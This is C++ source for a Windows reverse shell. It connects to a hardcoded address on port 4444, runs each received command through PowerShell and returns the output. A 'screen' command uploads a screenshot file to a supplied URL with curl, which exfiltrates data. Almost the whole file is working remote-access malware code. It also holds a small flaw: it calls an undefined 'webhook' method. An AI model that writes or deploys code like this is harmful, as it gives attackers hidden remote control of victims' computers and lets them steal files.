#include <iostream>
#include <cstdio>
#include <string>
#include <WS2tcpip.h>
#include <vector>
#include <windows.h>
#include <cstring> 
#pragma comment(lib, "Ws2_32.lib")

// COMPILING COMMAND --> g++ name.cpp -o name.cpp -lws2_32
using namespace std;

WSADATA wsa;
WORD w = WSAStartup(MAKEWORD(2, 2), &wsa);
SOCKET s = socket(AF_INET, SOCK_STREAM, 0);

class NETWORK_TCP
{
public:
	void Send(string buf);
	void Connect(string ip, int port);
	bool check(string dta, char* arr);
	void chdir(char path[110]);
	void webhook_ss(string url);
};

NETWORK_TCP so;

void NETWORK_TCP::Send(string buf)
{
	send(s, buf.c_str(), buf.length(), 0);
}

void NETWORK_TCP::Connect(string ip, int port)
{
	if (s == INVALID_SOCKET)
	{
		cerr << WSAGetLastError() << endl;
		closesocket(s);
		WSACleanup();
	}
	sockaddr_in sock;
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	sock.sin_addr.s_addr = inet_addr(ip.c_str());
	connect(s, (sockaddr*)&sock, sizeof(sock));
}

bool NETWORK_TCP::check(string dta, char* arr)
{
	int len = dta.length();
	char a = strncmp(dta.c_str(), arr, len) == 0;
	return a;
}

void NETWORK_TCP::chdir(char path[110])
{
	char* r = path;
	r += 3;
	r[strlen(r) - 1] = '\0';
	cout << r;
	SetCurrentDirectory(r);
}

void NETWORK_TCP::webhook_ss(string url)
{
	string directory = "\"image=@C:\\Users\\vishu\\Pictures\\Screenshots\\1.png\" ";
	string comm = "curl -F ";
	string ur = "-X POST ";
	string l = url;
	string main = comm + directory + ur + l;
	system(main.c_str());
}

int main()
{
	so.Connect("192.168.1.8", 4444);
	while (true)
	{
		string da = "\n[*] >> ";
		so.Send(da);
		char buf[8192];
		ZeroMemory(buf, 8192);
		size_t re = recv(s, buf, 8192, 0);
		string dta = string(buf, 0, re);

		char* char_arr;
		string str_obj(dta);
		char_arr = &str_obj[0];

		if (so.check("cd ", char_arr))
		{
			so.chdir(char_arr);
		}
		else if (so.check("bye", char_arr))
		{
			string bye = "Bye...\nHope we will meet soon !!\n";
			so.Send(bye);
			closesocket(s);
			WSACleanup();
			break;
		}
		else if (so.check("screen", char_arr))
		{
			int r = dta.find(" ");
			string bu = dta.substr(r + 1);
			so.webhook(bu);
		}
		else if (so.check("webcam", char_arr))
		{
			string messages = "Will do something later, it's in progress !!";
			so.Send(messages);
		}
		else
		{
			try
			{
				string ps = "powershell " + dta;
				char buffer[2048];
				string result = "";
				FILE* pipe = _popen(ps.c_str(), "r");
				while (fgets(buffer, sizeof buffer, pipe) != NULL)
				{
					result += buffer;
				}
				cout << result;
				send(s, result.c_str(), result.length(), 0);
				_pclose(pipe);
			}
			catch (exception)
			{
				cerr << "Error\n";
			}			
		}
	}
}
